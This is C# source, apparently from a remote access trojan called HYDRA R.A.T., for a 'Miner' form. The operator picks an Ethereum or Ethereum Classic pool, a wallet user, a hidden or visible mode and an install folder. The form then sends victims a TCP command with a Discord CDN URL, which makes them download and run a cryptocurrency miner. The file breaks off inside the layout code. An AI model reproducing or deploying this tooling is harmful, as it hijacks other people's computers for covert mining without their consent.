using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using ns1;

namespace HYDRA_R.A.T
{
	public class FrmMiner : Form
	{
		public static Random random = new Random();

		private IContainer components;

		private Label label3;

		private StatusStrip statusStrip1;

		private ToolStripStatusLabel toolStripStatusLabel1;

		private BunifuTextBox textBox2;

		private BunifuTextBox textBox3;

		private BunifuDropdown comboBox2;

		private BunifuDropdown comboBox1;

		private MetroSetNumeric numericUpDown1;

		private BunifuRadioButton radioButtonETH;

		private SiticoneLabel siticoneLabel12;

		private SiticoneLabel siticoneLabel1;

		private BunifuRadioButton radioButtonETC;

		public Button button1;

		private BunifuCheckBox checkBox1;

		private SiticoneLabel siticoneLabel2;

		private SiticoneLabel siticoneLabel3;

		private SiticoneLabel siticoneLabel4;

		private SiticoneLabel siticoneLabel5;

		private SiticoneLabel siticoneLabel6;

		private Guna2ShadowForm guna2ShadowForm1;

		private BunifuIconButton btnLogout;

		public FrmMiner()
		{
			this.InitializeComponent();
		}

		private void Miner_Load(object sender, EventArgs e)
		{
			this.textBox3.Text = "Worker" + FrmMiner.RandomMutex(4);
			this.numericUpDown1.ForeColor = Color.WhiteSmoke;
		}

		public static string RandomMutex(int length)
		{
			return new string((from s in Enumerable.Repeat("0123456789", length)
				select s[FrmMiner.random.Next(s.Length)]).ToArray());
		}

		public static string US(string k, string t)
		{
			byte[] iV = new byte[16];
			byte[] buffer = Convert.FromBase64String(t);
			using Aes aes = Aes.Create();
			aes.Key = Encoding.UTF8.GetBytes(k);
			aes.IV = iV;
			ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
			using MemoryStream stream = new MemoryStream(buffer);
			using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
			using StreamReader streamReader = new StreamReader(stream2);
			return streamReader.ReadToEnd();
		}

		private void button1_Click(object sender, EventArgs e)
		{
			if (this.radioButtonETH.Checked)
			{
				if (this.checkBox1.Checked)
				{
					this.SendTCP("55*https://cdn.discordapp.com/attachments/859410781241475093/863207046005260298/ETH.txt*" + this.comboBox2.Text + "*" + this.numericUpDown1.Value + "*" + this.textBox2.Text + "*Show*" + this.comboBox1.SelectedIndex, (TcpClient)base.Tag);
				}
				else
				{
					this.SendTCP("55*https://cdn.discordapp.com/attachments/859410781241475093/863207046005260298/ETH.txt*" + this.comboBox2.Text + "*" + this.numericUpDown1.Value + "*" + this.textBox2.Text + "*Hide*" + this.comboBox1.SelectedIndex, (TcpClient)base.Tag);
				}
				if (this.radioButtonETH.Checked)
				{
					this.toolStripStatusLabel1.Text = "Logs : Command Sent ! ETH Miner will start..";
				}
				else
				{
					this.toolStripStatusLabel1.Text = "Logs : Command Sent ! ETC Miner will start..";
				}
			}
			else
			{
				if (this.checkBox1.Checked)
				{
					this.SendTCP("55*https://cdn.discordapp.com/attachments/859410781241475093/863207018042228766/ETC.txt*" + this.comboBox2.Text + "*" + this.numericUpDown1.Value + "*" + this.textBox2.Text + "*Show*" + this.comboBox1.SelectedIndex, (TcpClient)base.Tag);
				}
				else
				{
					this.SendTCP("55*https://cdn.discordapp.com/attachments/859410781241475093/863207018042228766/ETC.txt*" + this.comboBox2.Text + "*" + this.numericUpDown1.Value + "*" + this.textBox2.Text + "*Hide*" + this.comboBox1.SelectedIndex, (TcpClient)base.Tag);
				}
				if (this.radioButtonETH.Checked)
				{
					this.toolStripStatusLabel1.Text = "Logs : Command Sent ! ETC Miner will start..";
				}
				else
				{
					this.toolStripStatusLabel1.Text = "Logs : Command Sent ! ETC Miner will start..";
				}
			}
		}

		public void SendTCP(object object_0, TcpClient tcpClient_0)
		{
			if (object_0 == null)
			{
				return;
			}
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
			binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
			binaryFormatter.FilterLevel = TypeFilterLevel.Full;
			checked
			{
				lock (tcpClient_0)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(object_0);
					ulong num = 0uL;
					MemoryStream memoryStream = new MemoryStream();
					binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
					num = (ulong)memoryStream.Position;
					tcpClient_0.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
					byte[] buffer = memoryStream.GetBuffer();
					tcpClient_0.GetStream().Write(buffer, 0, (int)num);
					memoryStream.Close();
					memoryStream.Dispose();
				}
			}
		}

		private void button2_Click(object sender, EventArgs e)
		{
		}

		private void btnLogout_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																																													this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HYDRA_R.A.T.FrmMiner));
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			this.label3 = new System.Windows.Forms.Label();
			this.statusStrip1 = new System.Windows.Forms.StatusStrip();
			this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
			this.textBox2 = new Bunifu.UI.WinForms.BunifuTextBox();
			this.textBox3 = new Bunifu.UI.WinForms.BunifuTextBox();
			this.comboBox2 = new Bunifu.UI.WinForms.BunifuDropdown();
			this.comboBox1 = new Bunifu.UI.WinForms.BunifuDropdown();
			this.numericUpDown1 = new MetroSet_UI.Controls.MetroSetNumeric();
			this.radioButtonETH = new Bunifu.UI.WinForms.BunifuRadioButton();
			this.siticoneLabel12 = new SiticoneLabel();
			this.siticoneLabel1 = new SiticoneLabel();
			this.radioButtonETC = new Bunifu.UI.WinForms.BunifuRadioButton();
			this.button1 = new System.Windows.Forms.Button();
			this.checkBox1 = new Bunifu.UI.WinForms.BunifuCheckBox();
			this.siticoneLabel2 = new SiticoneLabel();
			this.siticoneLabel3 = new SiticoneLabel();
			this.siticoneLabel4 = new SiticoneLabel();
			this.siticoneLabel5 = new SiticoneLabel();
			this.siticoneLabel6 = new SiticoneLabel();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.btnLogout = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			base.SuspendLayout();
			this.label3.AutoSize = true;
			this.label3.Location = new System.Drawing.Point(511, 94);
			this.label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(12, 17);
			this.label3.TabIndex = 5;
			this.label3.Text = ":";
			this.statusStrip1.BackColor = System.Drawing.Color.Transparent;
			this.statusStrip1.Font = new System.Drawing.Font("Century Gothic", 12f);
			this.statusStrip1.Location = new System.Drawing.Point(0, 382);
			this.statusStrip1.Name = "statusStrip1";
			this.statusStrip1.Padding = new System.Windows.Forms.Padding(2, 0, 18, 0);
			this.statusStrip1.Size = new System.Drawing.Size(742, 22);
			this.statusStrip1.TabIndex = 17;
			this.statusStrip1.Text = "statusStrip1";
			this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
			this.toolStripStatusLabel1.Size = new System.Drawing.Size(60, 17);
			this.toolStripStatusLabel1.Text = "Logs : Idle";
			this.textBox2.AcceptsReturn = false;
			this.textBox2.AcceptsTab = false;
			this.textBox2.AnimationSpeed = 200;
			this.textBox2.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
			this.textBox2.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
			this.textBox2.AutoSizeHeight = true;
			this.textBox2.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox2.BackgroundImage = (System.Drawing.Image)resources.GetObject("textBox2.BackgroundImage");
			this.textBox2.BorderColorActive = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox2.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
			this.textBox2.BorderColorHover = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox2.BorderColorIdle = System.Drawing.Color.FromArgb(226, 28, 71);
			this.textBox2.BorderRadius = 1;
			this.textBox2.BorderThickness = 1;
			this.textBox2.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
			this.textBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox2.DefaultFont = new System.Drawing.Font("Century Gothic", 11.25f);
			this.textBox2.DefaultText = "";
			this.textBox2.FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox2.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.textBox2.HideSelection = true;
			this.textBox2.IconLeft = null;
			this.textBox2.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox2.IconPadding = 10;
			this.textBox2.IconRight = null;
			this.textBox2.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox2.Lines = new string[0];
			this.textBox2.Location = new System.Drawing.Point(148, 123);
			this.textBox2.MaxLength = 32767;
			this.textBox2.MinimumSize = new System.Drawing.Size(1, 1);
			this.textBox2.Modified = false;
			this.textBox2.Multiline = false;
			this.textBox2.Name = "textBox2";
			stateProperties.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties.FillColor = System.Drawing.Color.Empty;
			stateProperties.ForeColor = System.Drawing.Color.Empty;
			stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox2.OnActiveState = stateProperties;
			stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
			stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
			stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
			stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
			this.textBox2.OnDisabledState = stateProperties2;
			stateProperties3.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties3.FillColor = System.Drawing.Color.Empty;
			stateProperties3.ForeColor = System.Drawing.Color.Empty;
			stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox2.OnHoverState = stateProperties3;
			stateProperties4.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			stateProperties4.FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties4.ForeColor = System.Drawing.Color.WhiteSmoke;
			stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox2.OnIdleState = stateProperties4;
			this.textBox2.Padding = new System.Windows.Forms.Padding(3);
			this.textBox2.PasswordChar = '\0';
			this.textBox2.PlaceholderForeColor = System.Drawing.Color.Silver;
			this.textBox2.PlaceholderText = "User";
			this.textBox2.ReadOnly = false;
			this.textBox2.ScrollBars = System.Windows.Forms.ScrollBars.None;
			this.textBox2.SelectedText = "";
			this.textBox2.SelectionLength = 0;
			this.textBox2.SelectionStart = 0;
			this.textBox2.ShortcutsEnabled = true;
			this.textBox2.Size = new System.Drawing.Size(477, 41);
			this.textBox2.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Material;
			this.textBox2.TabIndex = 241;
			this.textBox2.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
			this.textBox2.TextMarginBottom = 0;
			this.textBox2.TextMarginLeft = 3;
			this.textBox2.TextMarginTop = 1;
			this.textBox2.TextPlaceholder = "User";
			this.textBox2.UseSystemPasswordChar = false;
			this.textBox2.WordWrap = true;
			this.textBox3.AcceptsReturn = false;
			this.textBox3.AcceptsTab = false;
			this.textBox3.AnimationSpeed = 200;
			this.textBox3.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
			this.textBox3.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
			this.textBox3.AutoSizeHeight = true;
			this.textBox3.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox3.BackgroundImage = (System.Drawing.Image)resources.GetObject("textBox3.BackgroundImage");
			this.textBox3.BorderColorActive = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox3.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
			this.textBox3.BorderColorHover = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox3.BorderColorIdle = System.Drawing.Color.FromArgb(226, 28, 71);
			this.textBox3.BorderRadius = 1;
			this.textBox3.BorderThickness = 1;
			this.textBox3.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
			this.textBox3.Cursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox3.DefaultFont = new System.Drawing.Font("Century Gothic", 11.25f);
			this.textBox3.DefaultText = "Worker1";
			this.textBox3.FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox3.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.textBox3.HideSelection = true;
			this.textBox3.IconLeft = null;
			this.textBox3.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox3.IconPadding = 10;
			this.textBox3.IconRight = null;
			this.textBox3.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
			this.textBox3.Lines = new string[1] { "Worker1" };
			this.textBox3.Location = new System.Drawing.Point(148, 170);
			this.textBox3.MaxLength = 32767;
			this.textBox3.MinimumSize = new System.Drawing.Size(1, 1);
			this.textBox3.Modified = false;
			this.textBox3.Multiline = false;
			this.textBox3.Name = "textBox3";
			stateProperties5.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties5.FillColor = System.Drawing.Color.Empty;
			stateProperties5.ForeColor = System.Drawing.Color.Empty;
			stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox3.OnActiveState = stateProperties5;
			stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
			stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
			stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
			stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
			this.textBox3.OnDisabledState = stateProperties6;
			stateProperties7.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties7.FillColor = System.Drawing.Color.Empty;
			stateProperties7.ForeColor = System.Drawing.Color.Empty;
			stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox3.OnHoverState = stateProperties7;
			stateProperties8.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			stateProperties8.FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			stateProperties8.ForeColor = System.Drawing.Color.WhiteSmoke;
			stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
			this.textBox3.OnIdleState = stateProperties8;
			this.textBox3.Padding = new System.Windows.Forms.Padding(3);
			this.textBox3.PasswordChar = '\0';
			this.textBox3.PlaceholderForeColor = System.Drawing.Color.Silver;
			this.textBox3.PlaceholderText = "Pass";
			this.textBox3.ReadOnly = false;
			this.textBox3.ScrollBars = System.Windows.Forms.ScrollBars.None;
			this.textBox3.SelectedText = "";
			this.textBox3.SelectionLength = 0;
			this.textBox3.SelectionStart = 7;
			this.textBox3.ShortcutsEnabled = true;
			this.textBox3.Size = new System.Drawing.Size(477, 41);
			this.textBox3.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Material;
			this.textBox3.TabIndex = 242;
			this.textBox3.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
			this.textBox3.TextMarginBottom = 0;
			this.textBox3.TextMarginLeft = 3;
			this.textBox3.TextMarginTop = 1;
			this.textBox3.TextPlaceholder = "Pass";
			this.textBox3.UseSystemPasswordChar = false;
			this.textBox3.WordWrap = true;
			this.comboBox2.BackColor = System.Drawing.Color.Transparent;
			this.comboBox2.BackgroundColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.comboBox2.BorderColor = System.Drawing.Color.FromArgb(45, 47, 59);
			this.comboBox2.BorderRadius = 1;
			this.comboBox2.Color = System.Drawing.Color.FromArgb(45, 47, 59);
			this.comboBox2.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
			this.comboBox2.DisabledBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.comboBox2.DisabledBorderColor = System.Drawing.Color.FromArgb(45, 47, 59);
			this.comboBox2.DisabledColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.comboBox2.DisabledForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
			this.comboBox2.DisabledIndicatorColor = System.Drawing.Color.DarkGreen;
			this.comboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
			this.comboBox2.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
			this.comboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
			this.comboBox2.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
			this.comboBox2.FillDropDown = true;
			this.comboBox2.FillIndicator = false;
			this.comboBox2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
			this.comboBox2.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.comboBox2.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.comboBox2.FormattingEnabled = true;
			this.comboBox2.Icon = null;
			this.comboBox2.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
			this.comboBox2.IndicatorColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.comboBox2.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
			this.comboBox2.IndicatorThickness = 2;
			this.comboBox2.IsDropdownOpened = false;
			this.comboBox2.ItemBackColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.comboBox2.ItemBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.comboBox2.ItemForeColor = System.Drawing.Color.WhiteSmoke;
			this.comboBox2.ItemHeight = 26;
			this.comboBox2.ItemHighLightColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.comboBox2.ItemHighLightForeColor = System.Drawing.Color.WhiteSmoke;
			this.comboBox2.Items.AddRange(new object[13]
			{
				"---------------------", "            ETH", "---------------------", "asia1.ethermine.org", "eu1.ethermine.org", "us1.ethermine.org", "us2.ethermine.org", "---------------------", "            ETC", "---------------------",
				"asia1-etc.ethermine.org", "eu1-etc.ethermine.org", "us1-etc.ethermine.org"
			});
			this.comboBox2.ItemTopMargin = 3;
			this.comboBox2.Location = new System.Drawing.Point(148, 85);
			this.comboBox2.Name = "comboBox2";
			this.comboBox2.Size = new System.Drawing.Size(356, 32);
			this.comboBox2.TabIndex = 243;
			this.comboBox2.Text = null;
			this.comboBox2.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
			this.comboBox2.TextLeftMargin = 5;
			this.comboBox1.BackColor = System.Drawing.Color.Transparent;
			this.comboBox1.BackgroundColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.comboBox1.BorderColor = System.Drawing.Color.FromArgb(45, 47, 59);
			this.comboBox1.BorderRadius = 1;
			this.comboBox1.Color = System.Drawing.Color.FromArgb(45, 47, 59);
			this.comboBox1.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
			this.comboBox1.DisabledBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.comboBox1.DisabledBorderColor = System.Drawing.Color.FromArgb(45, 47, 59);
			this.comboBox1.DisabledColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.comboBox1.DisabledForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
			this.comboBox1.DisabledIndicatorColor = System.Drawing.Color.DarkGreen;
			this.comboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
			this.comboBox1.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
			this.comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
			this.comboBox1.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
			this.comboBox1.FillDropDown = true;
			this.comboBox1.FillIndicator = false;
			this.comboBox1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
			this.comboBox1.Font = new System.Drawing.Font("Century Gothic", 8.25f, System.Drawing.FontStyle.Bold);
			this.comboBox1.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.comboBox1.FormattingEnabled = true;
			this.comboBox1.Icon = null;
			this.comboBox1.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
			this.comboBox1.IndicatorColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.comboBox1.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
			this.comboBox1.IndicatorThickness = 2;
			this.comboBox1.IsDropdownOpened = false;
			this.comboBox1.ItemBackColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.comboBox1.ItemBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.comboBox1.ItemForeColor = System.Drawing.Color.WhiteSmoke;
			this.comboBox1.ItemHeight = 26;
			this.comboBox1.ItemHighLightColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.comboBox1.ItemHighLightForeColor = System.Drawing.Color.WhiteSmoke;
			this.comboBox1.Items.AddRange(new object[5] { "Desktop", "Local", "Program Files", "Roaming", "Temp" });
			this.comboBox1.ItemTopMargin = 3;
			this.comboBox1.Location = new System.Drawing.Point(148, 217);
			this.comboBox1.Name = "comboBox1";
			this.comboBox1.Size = new System.Drawing.Size(477, 32);
			this.comboBox1.TabIndex = 244;
			this.comboBox1.Text = null;
			this.comboBox1.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
			this.comboBox1.TextLeftMargin = 5;
			this.numericUpDown1.BackColor = System.Drawing.Color.Transparent;
			this.numericUpDown1.BackgroundColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.numericUpDown1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.numericUpDown1.DisabledBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.numericUpDown1.DisabledBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.numericUpDown1.DisabledForeColor = System.Drawing.Color.FromArgb(136, 136, 136);
			this.numericUpDown1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.numericUpDown1.IsDerivedStyle = true;
			this.numericUpDown1.Location = new System.Drawing.Point(537, 89);
			this.numericUpDown1.Maximum = 9999;
			this.numericUpDown1.Minimum = 1000;
			this.numericUpDown1.Name = "numericUpDown1";
			this.numericUpDown1.Size = new System.Drawing.Size(88, 26);
			this.numericUpDown1.Style = MetroSet_UI.Enums.Style.Custom;
			this.numericUpDown1.StyleManager = null;
			this.numericUpDown1.SymbolsColor = System.Drawing.Color.FromArgb(128, 128, 128);
			this.numericUpDown1.TabIndex = 245;
			this.numericUpDown1.Text = "metroSetNumeric1";
			this.numericUpDown1.ThemeAuthor = "Narwin";
			this.numericUpDown1.ThemeName = "MetroLite";
			this.numericUpDown1.Value = 4444;
			this.radioButtonETH.AllowBindingControlLocation = false;
			this.radioButtonETH.BackColor = System.Drawing.Color.Transparent;
			this.radioButtonETH.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
			this.radioButtonETH.BorderThickness = 1;
			this.radioButtonETH.Checked = true;
			this.radioButtonETH.Location = new System.Drawing.Point(149, 269);
			this.radioButtonETH.Name = "radioButtonETH";
			this.radioButtonETH.OutlineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.radioButtonETH.OutlineColorTabFocused = System.Drawing.Color.Firebrick;
			this.radioButtonETH.OutlineColorUnchecked = System.Drawing.Color.FromArgb(226, 28, 71);
			this.radioButtonETH.RadioColor = System.Drawing.Color.White;
			this.radioButtonETH.RadioColorTabFocused = System.Drawing.Color.FromArgb(226, 28, 71);
			this.radioButtonETH.Size = new System.Drawing.Size(21, 21);
			this.radioButtonETH.TabIndex = 246;
			this.radioButtonETH.Text = null;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Location = new System.Drawing.Point(178, 268);
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Name = "siticoneLabel12";
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Size = new System.Drawing.Size(31, 23);
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).TabIndex = 247;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Text = "ETH";
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel1.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel1.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Location = new System.Drawing.Point(592, 268);
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Name = "siticoneLabel1";
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Size = new System.Drawing.Size(33, 23);
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).TabIndex = 248;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Text = "ETC";
			this.radioButtonETC.AllowBindingControlLocation = false;
			this.radioButtonETC.BackColor = System.Drawing.Color.Transparent;
			this.radioButtonETC.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
			this.radioButtonETC.BorderThickness = 1;
			this.radioButtonETC.Checked = false;
			this.radioButtonETC.Location = new System.Drawing.Point(564, 269);
			this.radioButtonETC.Name = "radioButtonETC";
			this.radioButtonETC.OutlineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.radioButtonETC.OutlineColorTabFocused = System.Drawing.Color.Firebrick;
			this.radioButtonETC.OutlineColorUnchecked = System.Drawing.Color.FromArgb(226, 28, 71);
			this.radioButtonETC.RadioColor = System.Drawing.Color.White;
			this.radioButtonETC.RadioColorTabFocused = System.Drawing.Color.FromArgb(226, 28, 71);
			this.radioButtonETC.Size = new System.Drawing.Size(21, 21);
			this.radioButtonETC.TabIndex = 249;
			this.radioButtonETC.Text = null;
			this.button1.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.button1.BackgroundImage = (System.Drawing.Image)resources.GetObject("button1.BackgroundImage");
			this.button1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.button1.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.button1.FlatAppearance.BorderSize = 0;
			this.button1.FlatAppearance.CheckedBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.button1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
			this.button1.Font = new System.Drawing.Font("Century Gothic", 11.25f);
			this.button1.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.button1.Location = new System.Drawing.Point(466, 307);
			this.button1.Name = "button1";
			this.button1.Size = new System.Drawing.Size(205, 49);
			this.button1.TabIndex = 250;
			this.button1.Text = "Confirm/Send";
			this.button1.UseVisualStyleBackColor = true;
			this.button1.Click += new System.EventHandler(button1_Click);
			this.checkBox1.AllowBindingControlAnimation = true;
			this.checkBox1.AllowBindingControlColorChanges = false;
			this.checkBox1.AllowBindingControlLocation = true;
			this.checkBox1.AllowCheckBoxAnimation = false;
			this.checkBox1.AllowCheckmarkAnimation = true;
			this.checkBox1.AllowOnHoverStates = true;
			this.checkBox1.AutoCheck = true;
			this.checkBox1.BackColor = System.Drawing.Color.Transparent;
